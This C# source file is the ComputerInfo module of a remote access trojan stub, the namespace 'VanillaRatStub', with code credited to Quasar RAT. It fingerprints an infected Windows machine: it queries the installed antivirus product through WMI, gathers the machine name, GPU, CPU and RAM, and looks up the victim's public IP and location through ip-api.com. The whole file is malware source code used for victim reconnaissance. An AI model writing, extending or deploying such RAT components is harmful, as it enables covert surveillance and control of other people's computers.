using System;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.Serialization.Json;
using System.Text;

namespace VanillaRatStub
{
    internal class ComputerInfo
    {
        //From Quasar Rat
        public static GeoInfo GeoInfo { get; private set; }

        public static string RemoveLastChars(string input, int amount = 2)
        {
            if (input.Length > amount)
                input = input.Remove(input.Length - amount);
            return input;
        }

        public static string GetAntivirus()
        {
            try
            {
                string Name = string.Empty;
                bool WinDefend = false;
                string Path = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher(Path, "SELECT * FROM AntivirusProduct"))
                {
                    foreach (var Instance in MOS.Get())
                    {
                        if (Instance.GetPropertyValue("displayName").ToString() == "Windows Defender")
                            WinDefend = true;
                        if (Instance.GetPropertyValue("displayName").ToString() != "Windows Defender")
                            Name = Instance.GetPropertyValue("displayName").ToString();
                    }
                    if (Name == string.Empty && WinDefend)
                        Name = "Windows Defender";
                    if (Name == "")
                        Name = "N/A";
                    return Name;
                }
            }
            catch { return "N/A"; }
        }

        public static string GetName()
        {
            return Environment.MachineName;
        }

        public static string GetGPU()
        {
            try
            {
                string Name = string.Empty;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration"))
                {
                    foreach (ManagementObject MO in MOS.Get())
                    {
                        Name += MO["Description"].ToString() + " ;";
                    }
                }
                Name = RemoveLastChars(Name);
                return (!string.IsNullOrEmpty(Name)) ? Name : "N/A";
            }
            catch { return "N/A"; }
        }

        public static string GetCPU()
        {
            try
            {
                string Name = string.Empty;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
                {
                    foreach (ManagementObject MO in MOS.Get())
                    {
                        Name += MO["Name"].ToString() + "; ";
                    }
                }
                Name = RemoveLastChars(Name);
                return (!string.IsNullOrEmpty(Name)) ? Name : "N/A";
            }
            catch { }
            return "N/A";
        }

        public static int GetRamAmount()
        {
            try
            {
                int RamAmount = 0;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (ManagementObject MO in MOS.Get())
                    {
                        double Bytes = (Convert.ToDouble(MO["TotalPhysicalMemory"]));
                        RamAmount = (int)(Bytes / 1048576);
                        break;
                    }
                }
                return RamAmount;
            }
            catch { return -1; }
        }

        public static void GetGeoInfo()
        {
            try
            {
                DataContractJsonSerializer JS = new DataContractJsonSerializer(typeof(GeoInfo));
                HttpWebRequest Request = (HttpWebRequest)WebRequest.Create("http://ip-api.com/json/");
                Request.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
                Request.Proxy = null;
                Request.Timeout = 10000;
                using (HttpWebResponse Response = (HttpWebResponse)Request.GetResponse())
                {
                    using (Stream DS = Response.GetResponseStream())
                    {
                        using (StreamReader Reader = new StreamReader(DS))
                        {
                            string ResponseString = Reader.ReadToEnd();
                            using (MemoryStream MS = new MemoryStream(Encoding.UTF8.GetBytes(ResponseString)))
                            {
                                GeoInfo = (VanillaRatStub.GeoInfo)JS.ReadObject(MS);
                            }
                        }
                    }
                }
            }
            catch { }
            GeoInfo.Ip = (string.IsNullOrEmpty(GeoInfo.Ip)) ? "N/A" : GeoInfo.Ip;
            GeoInfo.Country = (string.IsNullOrEmpty(GeoInfo.Country)) ? "N/A" : GeoInfo.Country;
            GeoInfo.CountryCode = (string.IsNullOrEmpty(GeoInfo.CountryCode)) ? "-" : GeoInfo.CountryCode;
            GeoInfo.Region = (string.IsNullOrEmpty(GeoInfo.Region)) ? "N/A" : GeoInfo.Region;
            GeoInfo.City = (string.IsNullOrEmpty(GeoInfo.City)) ? "N/A" : GeoInfo.City;
            GeoInfo.Timezone = (string.IsNullOrEmpty(GeoInfo.Timezone)) ? "N/A" : GeoInfo.Timezone;
            GeoInfo.Isp = (string.IsNullOrEmpty(GeoInfo.Isp)) ? "N/A" : GeoInfo.Isp;
        }
    }
}